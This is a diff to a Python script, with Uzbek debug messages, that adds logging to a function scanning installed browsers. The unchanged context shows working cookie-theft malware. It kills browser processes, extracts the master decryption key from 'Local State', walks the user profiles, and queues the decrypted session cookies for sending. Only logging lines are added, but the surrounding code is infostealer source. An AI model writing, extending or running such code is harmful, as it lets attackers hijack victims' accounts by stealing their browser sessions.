@@ -245,8 +245,10 @@ def scan_browsers():
     for b_name, info in browsers.items():
         base_path = info["path"]
         if not os.path.exists(base_path):
+            debug_print(f"Topilmadi (papka yo'q): {b_name}")
             continue
 
+        debug_print(f"Tekshirilmoqda: {b_name}")
         kill_browsers(info["procs"])
 
         local_state_path = os.path.join(base_path, "Local State")
@@ -255,6 +257,7 @@ def scan_browsers():
 
         master_key = get_master_key(local_state_path)
         if not master_key:
+            debug_print(f"Master key olinmadi: {b_name}")
             continue
 
         profile_folders = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", ""]
@@ -295,12 +298,14 @@ def scan_browsers():
                                 if valid_cookie not in sent_cookies and not any(item['cookie'] == valid_cookie for item in pending_queue):
                                     debug_print(f"Yangi cookie topildi ({b_name}), navbatga qo'shildi.")
                                     pending_queue.append({"cookie": valid_cookie, "browser": b_name})
-            except Exception:
+            except Exception as e:
+                debug_print(f"Baza o'qishda xato ({b_name}): {e}")
                 if os.path.exists(temp_db):
                     os.remove(temp_db)
 
     cache["pending_queue"] = pending_queue
     save_cache(cache)
+    debug_print("Skanerlash yakunlandi, internet tsikliga o'tilmoqda...")
 
 def main():
     debug_print("Skript ishga tushdi...")
